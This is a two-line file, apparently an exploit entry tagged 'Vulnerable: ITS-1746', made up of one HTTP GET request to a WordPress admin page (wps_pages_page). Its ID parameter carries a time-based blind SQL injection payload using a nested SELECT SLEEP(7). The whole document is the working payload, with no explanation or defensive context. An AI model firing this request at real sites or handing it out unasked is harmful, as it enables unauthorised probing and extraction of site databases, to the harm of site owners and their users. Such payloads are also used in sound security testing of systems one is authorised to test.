# Vulnerable: ITS-1746
GET /wp-admin/admin.php?page=wps_pages_page&type=1&ID=1+AND+(SELECT+*+from+(select+SLEEP(7))a)
